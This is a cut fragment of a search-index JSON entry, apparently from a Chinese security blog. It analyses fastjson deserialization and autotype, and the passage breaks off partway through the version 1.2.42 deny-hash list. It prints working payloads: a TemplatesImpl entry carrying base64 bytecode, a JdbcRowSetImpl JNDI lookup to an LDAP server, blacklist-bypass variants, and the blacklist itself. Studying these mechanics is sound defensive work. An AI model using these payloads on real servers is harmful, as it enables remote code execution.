%>","title":"\u5185\u5b58\u9a6c\u5b9e\u73b0\u6d41\u7a0b\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/","tags":["java","\u7ec4\u4ef6\u5b89\u5168","java\u5b89\u5168"],"text":"fastjson # \u4ee5\u4e0b\u4ee3\u7801\u6765\u6e90\u4e8efastjson1.2.25 fastjson\u53cd\u5e8f\u5217\u5316\u672c\u8d28\u4e0a\u5c31\u662f\u901a\u8fc7\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u81ea\u52a8\u8c03\u7528getter\u548csetter\u65b9\u6cd5\uff0c\u800c\u67d0\u4e9b\u7c7b\u7684getter\u548csetter\u65b9\u6cd5\u5b58\u5728\u67d0\u4e9b\u5371\u9669\u903b\u8f91(\u5982\u6211\u4eec\u7684\u8001\u670b\u53cb TemplatesImpl )\uff0c\u4ece\u800c\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684(\u5982RCE)\u3002 fastjson\u4f7f\u7528 # fastjson\u4e2d\u5e38\u7528\u5230\u7684\u53cd\u5e8f\u5217\u5316\u7684\u65b9\u6cd5\u4e00\u5171\u6709\u4e09\u4e2a: - JSON.parse(String) - JSON.parseObject(String) - JSON.parseObject(String, clazz) \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u5b58\u5728\u7740\u4e00\u4e9b\u5dee\u5f02\uff0c\u53ef\u4ee5\u770b\u540e\u7eed\u7684\u7b80\u7565\u5206\u6790\u3002\u8be6\u60c5\u53ef\u4ee5\u89c1 \u8fd9\u91cc \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: import java.util.Properties ; public class User { public Integer id ; public String name ; private Properties t1 ; public User () { System . out . println ( \"call default constructor\" ); } public String getName () { System . out . println ( \"call get name\" ); return name ; } public void setName ( String name ) { System . out . println ( \"call set name\" ); this . name = name ; } public Integer getId () { System . out . println ( \"call get id\" ); return id ; } public Properties getT1 () { System . out . println ( \"call get t1\" ); return t1 ; } public void setId ( Integer id ) { System . out . println ( \"call set id\" ); this . id = id ; } public User ( Integer id , String name , Properties t1 ) { System . out . println ( \"call constructor\" ); this . id = id ; this . name = name ; this . t1 = t1 ; } @Override public String toString () { return \"User{\" + \"id=\" + id + \", name='\" + name + '\\'' + \", t1=\" + t1 + '}' ; } } import com.alibaba.fastjson.JSON ; import com.alibaba.fastjson.parser.Feature ; import com.alibaba.fastjson.parser.ParserConfig ; public class Main { public static void main ( String [] args ) { User u = new User ( 5 , \"tom\" , new Properties ()); System . out . println ( \"-------toJSONString()------\" ); System . out . println ( JSON . toJSONString ( u )); System . out . println ( \"-------parse(str)------\" ); ParserConfig . getGlobalInstance (). setAutoTypeSupport ( true ); String s = \"{\\\"@type\\\":\\\"User\\\", \\\"id\\\": 123, \\\"name\\\":\\\"Tom\\\", \\\"t1\\\":{}}\" ; System . out . println ( JSON . parse ( s )); System . out . println ( \"-------parseObject(str)------\" ); System . out . println ( JSON . parseObject ( s )); System . out . println ( \"-------parseObject(str, User.class)------\" ); System . out . println ( JSON . parseObject ( s , User . class )); } } \u6700\u540e\u8f93\u51fa\u5982\u4e0b: call constructor -------toJSONString()------ call get id call get name call get t1 {\"id\":5,\"name\":\"tom\",\"t1\":{}} -------parse(str)------ call default constructor call set id call set name call get t1 User{id=123, name='Tom', t1=null} -------parseObject(str)------ call default constructor call set id call set name call get t1 call get id call get name call get t1 {\"name\":\"Tom\",\"id\":123} -------parseObject(str, User.class)------ call default constructor call set id call set name call get t1 User{id=123, name='Tom', t1=null} \u901a\u8fc7\u4e0a\u9762\u7684\u8f93\u51fa\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0fastjson\u5728\u5e8f\u5217\u5316\u7684\u65f6\u5019\u4f1a\u8c03\u7528getter\u65b9\u6cd5\uff0c\u800c\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u4f18\u5148\u8c03\u7528\u7c7b\u7684\u65e0\u53c2\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5\uff0c\u7136\u540e\u901a\u8fc7setter\u7684\u65b9\u5f0f\u53bb\u8fd8\u539f\u6211\u4eec\u7684\u5bf9\u8c61\u3002 \u6211\u4eec\u53ef\u4ee5\u770b\u5230 parse(str) \u548c parseObject(str, User.class) \u7684\u8f93\u51fa\u662f\u4e00\u6837\u7684\uff0c\u800c parseObject(str) \u7684\u7ed3\u679c\u5374\u4e0d\u592a\u4e00\u6837\u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e9b\u6bd4\u8f83\u6709\u8da3\u7684\u5730\u65b9: 1. \u4e3a\u4ec0\u4e48 parseObject(str) \u548c\u53e6\u5916\u4e24\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u884c\u4e3a\u4e0d\u4e00\u6837\uff1f(\u628a\u6240\u6709\u7684getter\u65b9\u6cd5\u8c03\u7528\u4e86\u4e00\u904d) 2. \u4e3a\u4ec0\u4e48\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u8c03\u7528 getT1() \uff0c\u800c\u4e0d\u4f1a\u8c03\u7528\u5176\u4ed6\u7684getter\u65b9\u6cd5\uff1f ### \u7b2c\u4e00\u4e2a\u95ee\u9898 \u4e3a\u4ec0\u4e48 parseObject(str) \u548c\u53e6\u5916\u4e24\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u884c\u4e3a\u4e0d\u4e00\u6837\uff1f(\u628a\u6240\u6709\u7684getter\u65b9\u6cd5\u8c03\u7528\u4e86\u4e00\u904d) \u8fd9\u4e2a\u65b9\u6cd5\u7684\u539f\u56e0\u5728\u4e8e parseObject(str) \u65f6\u6700\u7ec8\u8fd4\u56de\u7684\u662fJSONObject\uff0c\u4f1a\u989d\u5916\u8c03\u7528\u4e00\u6b21 toJSON(obj) \u3002 public static JSONObject parseObject ( String text ) { Object obj = parse ( text ); return obj instanceof JSONObject ? ( JSONObject ) obj : ( JSONObject ) toJSON ( obj ); } \u5b8c\u6574\u7684\u8c03\u7528\u94fe\u5982\u4e0b: toJSON() \u65b9\u6cd5\u4f1a\u5c06\u76ee\u6807\u7c7b\u4e2d\u6240\u6709getter\u65b9\u6cd5\u8bb0\u5f55\u4e0b\u6765\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u53bb\u8c03\u7528\u4e86\u6240\u6709\u7684getter\u65b9\u6cd5 \u7b2c\u4e8c\u4e2a\u95ee\u9898 # \u4e3a\u4ec0\u4e48\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u8c03\u7528 getT1() \uff0c\u800c\u4e0d\u4f1a\u8c03\u7528\u5176\u4ed6\u7684getter\u65b9\u6cd5\uff1f \u8fd9\u4e2a\u95ee\u9898\u7684\u7b54\u6848\u8981\u5230 JavaBeanInfo.build() \u65b9\u6cd5\u4e2d\u53bb\u5bfb\u627e: \u5728 JavaBeanInfo.build() \u65b9\u6cd5\u4e2d\uff0c\u7a0b\u5e8f\u5c06\u4f1a\u521b\u5efa\u4e00\u4e2afieldList\u6570\u7ec4\u6765\u5b58\u653e\u540e\u7eed\u5c06\u8981\u5904\u7406\u7684\u76ee\u6807\u7c7b\u7684 setter\u65b9\u6cd5\u53ca\u67d0\u4e9b\u7279\u5b9a\u6761\u4ef6\u7684getter\u65b9\u6cd5\u3002 \u90a3\u4e48\u4ec0\u4e48getter\u65b9\u6cd5\u6ee1\u8db3\u6761\u4ef6\u5462\uff1f if ( methodName . length () >= 4 && ! Modifier . isStatic ( method . getModifiers ()) && methodName . startsWith ( \"get\" ) && Character . isUpperCase ( methodName . charAt ( 3 )) && method . getParameterTypes (). length == 0 && ( Collection . class . isAssignableFrom ( method . getReturnType ()) || Map . class . isAssignableFrom ( method . getReturnType ()) || AtomicBoolean . class == method . getReturnType () || AtomicInteger . class == method . getReturnType () || AtomicLong . class == method . getReturnType ())) { //... } // \u5982\u679c\u5b58\u5728setter\u65b9\u6cd5\uff0c\u8be5\u6210\u5458\u53d8\u91cf\u540d\u4f1a\u88ab\u52a0\u5165fieldList\uff0cfieldInfo\u5c31\u4e0d\u4e3anull\uff0c\u90a3\u4e48getter\u65b9\u6cd5\u5c31\u4e0d\u4f1a\u52a0\u5165fieldList fieldInfo = getField ( fieldList , propertyName ); if ( fieldInfo == null ) { if ( propertyNamingStrategy != null ) { propertyName = propertyNamingStrategy . translate ( propertyName ); } add ( fieldList , new FieldInfo ( propertyName , method , ( Field ) null , clazz , type , 0 , 0 , 0 , annotation , ( JSONField ) null , ( String ) null )); } \u5373\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6: - \u5bf9\u5e94\u6210\u5458\u53d8\u91cf\u7ee7\u627f\u81eaCollection/AtomicBoolean/AtomicInteger/AtomicLong - \u5bf9\u5e94\u6210\u5458\u53d8\u91cf\u6ca1\u6709setter\u65b9\u6cd5 - get\u5f00\u5934\u4e14\u7b2c\u56db\u4e2a\u5b57\u6bcd\u5927\u5199 - \u4e3a\u975e\u9759\u6001\u65b9\u6cd5\uff0c\u65e0\u53c2\u6570\u4f20\u5165 - \u5bf9\u5e94\u7684\u6210\u5458\u53d8\u91cf\u4e3a\u79c1\u6709\u53d8\u91cf(\u5982\u679c\u662f\u516c\u6709\u53d8\u91cf\u5219\u4f1a\u76f4\u63a5\u8d4b\u503c) \u4e00\u4e9b\u5176\u4ed6\u6ce8\u610f\u4e8b\u9879 # \u4e0a\u9762\u7684\u793a\u4f8b\u4ee3\u7801\u4e2d\u6709\u4e00\u4e2a\u6bd4\u8f83\u5947\u602a\u7684\u5730\u65b9\uff0c\u6211\u4eec\u662f\u76f4\u63a5\u6784\u9020\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u53bb\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u4e14\u8be5\u5b57\u7b26\u4e32\u4e2d\u8fd8\u5305\u542b\u4e86 @type \u8fd9\u4e2a\u9879\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u7528 toJSONString() \u7684\u5b57\u7b26\u4e32\u53bb\u53cd\u5e8f\u5217\u5316\uff0c\u7ed3\u679c\u662f\u4e0d\u662f\u4e0d\u4e00\u6837\u5462\uff1f\u4ee3\u7801\u6700\u7ec8\u7684\u8f93\u51fa\u7ed3\u679c\u5982\u4e0b: call constructor -------toJSONString()------ call get id call get name call get t1 {\"id\":5,\"name\":\"tom\",\"t1\":{}} -------parse(str)------ {\"name\":\"tom\",\"id\":5,\"t1\":{}} -------parseObject(str)------ {\"name\":\"tom\",\"id\":5,\"t1\":{}} -------parseObject(str, User.class)------ call default constructor call set id call set name call get t1 User{id=5, name='tom', t1=null} \u53ef\u4ee5\u770b\u5230 parse(str) \u548c parseObject(str) \u4e0d\u518d\u8c03\u7528getter\u548csetter\u65b9\u6cd5\uff0c\u800c\u662f\u8fd4\u56de\u4e86\u4e00\u4e2aJSONObject\u7c7b\u578b\uff0c\u5e76\u6ca1\u6709\u5c06\u7c7b\u578b\u8f6c\u6362\u4e3aUser\u7c7b\u578b\uff0c\u800c parseObject(str, User.class) \u5219\u5b9e\u73b0\u4e86\u7c7b\u578b\u8f6c\u6362\uff0c\u4f9d\u7136\u8c03\u7528\u4e86setter\u65b9\u6cd5\u548c\u67d0\u4e9bgetter\u65b9\u6cd5\u3002 \u6240\u4ee5\u6211\u4eec\u4e3a\u4e86\u80fd\u591f\u89e6\u53d1getter\u548csetter\u65b9\u6cd5\uff0c\u9700\u8981\u4f7f\u7528\u5230@type\u8fd9\u4e2a\u9879\uff0c@type\u662ffastjson\u4e2d\u7279\u6709\u7684\u9879\uff0c\u7528\u4e8e\u6807\u6ce8\u8fd9\u4e2a\u5bf9\u8c61\u7684\u7c7b\u578b\uff0c\u5f53fastjson\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u5c06\u8be5\u5bf9\u8c61\u8fdb\u884c\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\uff0c\u8fd9\u4e5f\u662ffastjson\u53cd\u5e8f\u5217\u5316\u7684\u7f6a\u9b41\u7978\u9996\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3aautotype\u3002 fastjson\u53cd\u5e8f\u5217\u5316 # \u53ef\u5229\u7528\u7684\u7c7b # TemplatesImpl # \u8fd9\u4e2a\u662f\u6211\u4eec\u7684\u8001\u670b\u53cb\u4e86\uff0c\u53ef\u4ee5\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u6216\u7f51\u4e0a\u7684\u6587\u7ae0\u4e2d\u627e\u5230\u5173\u4e8e\u5b83\u7684\u4ecb\u7ecd\u3002\u6211\u4eec\u77e5\u9053\uff0c\u53ea\u8981\u80fd\u591f\u8c03\u7528\u5230 TemplatesImpl.getOutputProperties() \u65b9\u6cd5\uff0c\u6700\u7ec8\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\u7ed3\u5408\u524d\u9762\u7684\u5206\u6790\uff0c\u6211\u4eec\u60f3\u8981\u89e6\u53d1getter\u65b9\u6cd5\uff0c\u9700\u8981\u6ee1\u8db3\u4e00\u5b9a\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b\u8fd9\u4e2a\u65b9\u6cd5\u662f\u5426\u6ee1\u8db3\u6761\u4ef6: // \u5bf9\u5e94\u7684\u6210\u5458\u53d8\u91cf private Properties _outputProperties ; // getter\u65b9\u6cd5 public synchronized Properties getOutputProperties () { try { return newTransformer (). getOutputProperties (); } catch ( TransformerConfigurationException e ) { return null ; } } \u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u6210\u5458\u53d8\u91cf\u5b8c\u7f8e\u5730\u6ee1\u8db3\u4e86\u6211\u4eec\u7684\u6761\u4ef6\uff0c\u4f46\u662f\u8fd9\u91cc\u5b58\u5728\u7591\u60d1: _outputProperties \u80fd\u591f\u548c getOutputProperties() \u65b9\u6cd5\u5bf9\u5e94\u5417\uff1f(\u591a\u4e86\u4e00\u4e2a\u4e0b\u5212\u7ebf) smartMatch # fastjson\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u5728 JavaBeanDeserializer.parseField() \u65b9\u6cd5\u4e2d\u4f7f\u7528\u4e86 smartMatch() \u8fd9\u4e2a\u65b9\u6cd5\u6765\u5bfb\u627e\u5bf9\u5e94\u7684\u6210\u5458\u53d8\u91cf: public boolean parseField ( DefaultJSONParser parser , String key , Object object , Type objectType , Map < String , Object > fieldValues ) { JSONLexer lexer = parser . lexer ; FieldDeserializer fieldDeserializer = smartMatch ( key ); //... return true ; } public FieldDeserializer smartMatch ( String key ) { // ... if ( fieldDeserializer == null ) { snakeOrkebab = false ; String key2 = null ; for ( i = 0 ; i < key . length (); ++ i ) { char ch = key . charAt ( i ); if ( ch == '_' ) { snakeOrkebab = true ; key2 = key . replaceAll ( \"_\" , \"\" ); break ; } if ( ch == '-' ) { snakeOrkebab = true ; key2 = key . replaceAll ( \"-\" , \"\" ); break ; } } // ... } \u53ef\u4ee5\u770b\u5230\u5176\u4f1a\u5c06\u6210\u5458\u53d8\u91cf\u4e2d\u7684 - , _ \u5ffd\u7565\u6389\uff0c\u4ece\u800c\u4f7f\u5f97 _outputProperties \u80fd\u591f\u548c getOutputProperties() \u65b9\u6cd5\u5bf9\u5e94\u3002 payload # { \"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\" , \"_bytecodes\" : [ \"yv66vgAAADMAHAEAA0NhdAcAFgEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIQ2F0LmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQALbm90ZXBhZC5leGUIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAFkV2aWxDYXQ2NTM4ODI3MzI3MTQxMDABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAXAQAGPGluaXQ+DAAZAAgKABgAGgAhAAIAGAAAAAAAAgAIAAcACAABAAkAAAAWAAIAAAAAAAq4AA8SEbYAFVexAAAAAAABABkACAABAAkAAAARAAEAAQAAAAUqtwAbsQAAAAAAAQAFAAAAAgAG\" ], \"_name\" : \"a\" , \"_tfactory\" : {}, \"outputProperties\" : {} } \u8fd9\u91cc\u6709\u51e0\u4e2a\u6ce8\u610f\u4e8b\u9879: 1. _bytecodes \u4e2d\u5c06\u5b57\u8282\u7801\u4f7f\u7528base64\u7f16\u7801\uff0c\u8fd9\u662f\u56e0\u4e3afastjson\u4f1a\u5bf9byte\u7c7b\u578b\u7684\u5b57\u6bb5\u8fdb\u884cbase64\u89e3\u7801\u7684\u7f18\u6545\uff0c\u8fd9\u4e5f\u65b9\u4fbf\u4e86\u6211\u4eec\u6784\u9020payload 2. _bytecode \u4e2d\u7684\u5b57\u8282\u7801\u662f\u4e00\u4e2a\u6784\u9020\u597d\u7684class\u7c7b\uff0c\u5176static\u5757\u4e2d\u5b58\u5728\u6076\u610f\u4ee3\u7801\uff0c\u53cd\u7f16\u8bd1\u540e\u5927\u81f4\u5982\u4e0b: import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; public class EvilCat653882732714100 extends AbstractTranslet { static { Runtime . getRuntime (). exec ( \"notepad.exe\" ); } public EvilCat653882732714100 () { } } 4. \u8fd9\u4e2a\u7c7b\u53ea\u80fd\u5728\u5f00\u542fSupportNonPublicField\u7279\u6027\u7684fastjson\u53cd\u5e8f\u5217\u5316\u4e2d\u4f7f\u7528\uff0c\u56e0\u4e3a _bytecodes , _tfactory \u7b49\u5c5e\u6027\u90fd\u6ca1\u6709\u5bf9\u5e94\u7684setter 5. _tfactory \u8bbe\u7f6e\u4e3a {} \uff0c\u8fd9\u6837fastjson\u4f1a\u751f\u6210\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u89e3\u51b3\u67d0\u4e9bjdk\u7248\u672c\u4e2d defineTransletClasses() \u7528\u5230\u4f1a\u5f15\u7528 _tfactory \u5c5e\u6027\u5bfc\u81f4\u5f02\u5e38\u9000\u51fa\u7684\u95ee\u9898 JdbcRowSetImpl # \u8fd9\u4e2a\u7c7b\u7684\u5173\u952e\u5728\u4e8e\u5176\u7684 setAutoCommit() \u65b9\u6cd5\uff0c\u6700\u7ec8\u4f1a\u53d1\u51fa\u4e00\u4e2a context.lookup(datasourceName) \u8bf7\u6c42\u5b9e\u73b0JNDI\u6ce8\u5165\u3002 payload # { \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true } \u5b89\u5168\u673a\u5236\u4e0ebypass # 1.2.25 # \u5728fastjson 1.2.25\u4e2d\u4e3a\u4e86\u89e3\u51b3\u53cd\u5e8f\u5217\u5316\u95ee\u9898\uff0c\u52a0\u5165\u4e86\u9ed1\u540d\u5355\u673a\u5236\u548c\u4e00\u4e2a\u5b89\u5168\u5f00\u5173: autotypesupport (\u9ed8\u8ba4\u503c\u4e3afalse)\u3002\u5982\u679c\u6211\u4eec\u5728>=1.2.25\u7248\u672c\u4e2d\u518d\u4f7f\u7528\u4e0a\u8ff0\u7684payload\u4f1a\u62a5\u9519: autoType is not support. \uff0c\u8fd9\u662f\u7531\u4e8e\u6211\u4eec\u4f7f\u7528\u7684\u7c7b\u52a0\u5165\u4e86\u9ed1\u540d\u5355\u7684\u7f18\u6545\u3002 \u6839\u636e\u62a5\u9519\uff0c\u6211\u4eec\u5728 ParserConfig.checkAutoType() \u4e2d\u627e\u5230\u4e86\u9ed1\u540d\u5355\u3002\u6574\u4e2a\u9ed1\u540d\u5355\u5982\u4e0b\uff0c\u53ea\u8981\u6211\u4eec\u4f7f\u7528\u7684\u7c7b\u662f\u4ee5\u8fd9\u4e9b\u5f00\u5934\uff0c\u5c31\u4f1a\u88ab\u9ed1\u540d\u5355\u62e6\u622a\u3002 bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework \u7136\u540e\u6211\u4eec\u518d\u770b\u770bautotypesupport\u7684\u4f5c\u7528\u662f\u4ec0\u4e48\uff0c\u901a\u8fc7\u5206\u6790 ParserConfig.checkAutoType() \u53ef\u4ee5\u77e5\u9053\u6839\u636e\u7c7b\u540d\u5bfb\u627e\u5bf9\u5e94\u7684\u7c7b\u7684\u6b65\u9aa4\u5927\u81f4\u5982\u4e0b( fastjson1.2.25\uff0c\u4e0d\u540c\u7248\u672c\u7684\u6b65\u9aa4\u6709\u53ef\u80fd\u6709\u5dee\u5f02 ): \u5982\u679c\u5f00\u542f\u4e86autotypesupport \u6216\u8005expectClass\u4e0d\u4e3a\u7a7a\u65f6\u5219\u6309\u767d\u9ed1\u540d\u5355\u5bfb\u627e\u7c7b(\u5177\u4f53\u6b65\u9aa4\u770b\u4e0b\u65b9) TypeUtils.getClassFromMapping(typeName) :\u5c1d\u8bd5\u4ece\u7f13\u5b58Map\u4e2d\u5bfb\u627e\u7c7b this.deserializers.findClass(typeName) : \u5c1d\u8bd5\u4ecedeserializers\u4e2d\u5bfb\u627e\u7c7b\uff0c\u5176\u4e2dbuckets\u4e2d\u5b58\u653e\u4e86\u4e00\u4e9bjava\u7684\u57fa\u7840\u7c7b \u5982\u679c\u4e0a\u8ff0\u627e\u5230\u4e86\u7c7b\uff0c\u5219\u76f4\u63a5\u8fd4\u56de \u5982\u679c\u672a\u5f00\u542fautotypesupport\u5219\u9ed1\u767d\u540d\u5355\u5bfb\u627e\u7c7b(\u5177\u4f53\u6b65\u9aa4\u770b\u4e0b\u65b9) expectClass\u6821\u9a8c\u548c\u6ce8\u89e3\u6821\u9a8c\uff0c\u5982\u679c\u901a\u8fc7\u5219\u8fd4\u56de \u5982\u679c\u4e0a\u8ff0\u627e\u5230\u4e86\u7c7b\uff0c\u5219\u8fd4\u56de \u672a\u5f00\u542f autoTypeSupport \u5219\u629b\u51fa\u5f02\u5e38(\u62e6\u622a) \u672a\u5f00\u542fautotypesupport # \u5f53\u672a\u5f00\u542fautotyesupport\u65f6\uff0c\u4f1a\u6709\u4ee5\u4e0b\u7684\u6b65\u9aa4: 1. \u5224\u65adtypename\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d(\u4ee5\u9ed1\u540d\u5355\u4e2d\u7684\u7c7b\u540d\u5f00\u5934)\uff0c\u5982\u679c\u662f\u5219\u76f4\u63a5\u62e6\u622a 2. \u5224\u65adtypename\u662f\u5426\u5728\u767d\u540d\u5355\u4e2d(\u9ed8\u8ba4\u4e3a\u7a7a)\uff0c\u5982\u679c\u662f\u5219\u6839\u636e\u7c7b\u540d\u5bfb\u627e\u7c7b \u53ef\u4ee5\u770b\u5230\u662f\u5148\u8fdb\u884c\u4e86\u4e00\u4e2a\u9ed1\u540d\u5355\u7684\u8fc7\u6ee4\uff0c\u518d\u4ece\u767d\u540d\u5355\u4e2d\u5bfb\u627e\u5141\u8bb8\u7684\u7c7b\u3002 \u5f00\u542fautotypesupport # \u5f53\u5f00\u542fautotypesupport\u65f6\uff0c\u4f1a\u6709\u4ee5\u4e0b\u7684\u6b65\u9aa4: 1. \u5224\u65adtypename\u662f\u5426\u5728\u5728\u767d\u540d\u5355\u4e2d\uff0c\u5982\u679c\u662f\u5219\u76f4\u63a5\u6839\u636e\u7c7b\u540d\u5bfb\u627e\u7c7b\u5e76\u8fd4\u56de 2. \u5224\u65adtypename\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d(\u4ee5\u9ed1\u540d\u5355\u4e2d\u7684\u7c7b\u540d\u5f00\u5934)\uff0c\u5982\u679c\u662f\u5219\u76f4\u63a5\u62e6\u622a 3. TypeUtils.loadClass(typeName, this.defaultClassLoader) : \u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u53bb\u5bfb\u627e\u7c7b\u5e76\u8fd4\u56de \u6ce8\u610f\u8fd9\u91cc\u7684\u767d\u540d\u5355\u548c\u6211\u4eec\u7406\u89e3\u4e0a\u7684\u767d\u540d\u5355\u5b58\u5728\u51fa\u5165\uff0c\u5728\u767d\u540d\u5355\u4e2d\u7684\u5185\u5bb9\u76f4\u63a5\u901a\u8fc7\uff0c\u4f46\u662f\u4e0d\u5728\u767d\u540d\u5355\u4e2d\u7684\u5185\u5bb9\u4e0d\u4e00\u5b9a\u4e0d\u901a\u8fc7(\u56e0\u4e3a\u5b58\u5728\u6b65\u9aa43\u7684\u7f18\u6545)\u3002 \u53ef\u4ee5\u770b\u5230\u5f00\u542f\u4e86autotypesupport\u540e\uff0c\u4f9d\u7136\u4f7f\u7528\u4e86\u9ed1\u767d\u540d\u5355\uff0c\u53ea\u662f\u987a\u5e8f\u98a0\u5012\u4e86\u3002\u540c\u65f6\u5047\u5982typename\u901a\u8fc7\u4e86\u9ed1\u767d\u540d\u5355\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7 TypeUtils.loadClass(typeName, this.defaultClassLoader); \u6765\u5bfb\u627e\u7c7b\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u540e\u9762\u4ecb\u7ecd\u7684\u7ed5\u8fc7\u65b9\u6cd5\u4e4b\u4e00\u3002 1.2.25-1.2.41 bypass # \u6839\u636e\u4e0a\u8ff0\u7684\u6b65\u9aa4\u6211\u4eec\u53d1\u73b0\u5728typename\u901a\u8fc7\u4e86\u9ed1\u767d\u540d\u5355\u540e\uff0c\u4f1a\u901a\u8fc7 TypeUtils.loadClass(typeName, this.defaultClassLoader); \u6765\u5bfb\u627e\u7c7b\uff0c\u901a\u8fc7\u5206\u6790\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5176\u6b65\u9aa4\u5982\u4e0b: 1. mappings.get(className) \u4ece\u4e00\u4e2a\u7f13\u5b58\u7684mapping\u4e2d\u5bfb\u627e\u7c7b 2. \u5982\u679cclassName\u4ee5 [ \u5f00\u5934\uff0c\u5219\u53bb\u9664\u8fd9\u4e2a\u5f00\u5934\u5e76\u901a\u8fc7\u9012\u5f52\u8c03\u7528\u5f53\u524d\u51fd\u6570\u5bfb\u627e\u7c7b 3. \u5982\u679cclassName\u4ee5 L \u5f00\u5934\uff0c ; \u7ed3\u5c3e\uff0c\u5219\u53bb\u9664\u8fd9\u4e2a\u5f00\u5934\u7ed3\u5c3e\u5e76\u901a\u8fc7\u9012\u5f52\u8c03\u7528\u5f53\u524d\u51fd\u6570\u5bfb\u627e\u7c7b 4. \u4f7f\u7528\u4f20\u5165\u7684 classLoader \u5bfb\u627e\u7c7b 5. \u4f7f\u7528\u5f53\u524d\u7ebf\u7a0b\u7684 contextClassLoader \u5bfb\u627e\u7c7b 6. \u4f7f\u7528 Class.forName \u5bfb\u627e\u7c7b \u4ece\u4ee5\u4e0a\u6b65\u9aa4\u6211\u4eec\u5c31\u53d1\u73b0\u4e86\u53ef\u4ee5\u7ed5\u8fc7\u9ed1\u767d\u540d\u5355\u5e76\u80fd\u6210\u529f\u52a0\u8f7d\u7c7b\u7684\u65b9\u6cd5: 1. \u7c7b\u540d\u4f7f\u7528 L \u5f00\u5934\uff0c ; \u7ed3\u5c3e 2. \u7c7b\u540d\u4f7f\u7528 [ \u987a\u4fbf\u4e00\u63d0fastjson\u4e3a\u4ec0\u4e48\u8981\u5904\u7406\u8fd9\u4e9b\u5947\u602a\u7684\u5b57\u7b26\uff0c\u5b9e\u9645\u4e0a\u5b83\u4eec\u662fJNI\u7684\u5b57\u6bb5\u63cf\u8ff0\u7b26\uff0c\u4ee5 L \u5f00\u5934; ; \u7ed3\u5c3e\u4ee3\u8868\u7684\u662fjava\u4e2d\u7684Object\uff0c\u4ee5 [ \u5f00\u5934\u4ee3\u8868\u7684\u662f\u6570\u7ec4\u3002 \u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u7684\u7ed5\u8fc7payload\u4e3a: { \"@type\" : \"Lcom.sun.rowset.JdbcRowSetImpl;\" , \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true } \u6216\u8005 { \"@type\" : \"[com.sun.rowset.JdbcRowSetImpl\" [{ \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true }]} \u6ce8\u610f\u7b2c\u4e8c\u4e2a\u7ed5\u8fc7\u7684payload\u5e76\u4e0d\u662f\u4e00\u4e2a\u5408\u6cd5\u7684json\u683c\u5f0f\uff0c\u4f46\u662ffastjson\u80fd\u591f\u6210\u529f\u89e3\u6790 1.2.42 # \u8fd9\u4e2a\u7248\u672c\u4e3b\u8981\u7684\u5b89\u5168\u6539\u52a8\u662f\u5c06\u9ed1\u540d\u5355\u6539\u4e3ahash\uff0c\u540c\u65f6\u4f7f\u7528hash\u53bb\u5904\u7406\u4e86 L [ ; \u5b57\u7b26\uff0c\u53bb\u9664\u5934\u5c3e\u7684 L [ ; : this . denyHashCodes = new long [] { - 8720046426850100497L , - 8109300701639721088L , - 7966123100503199569L , - 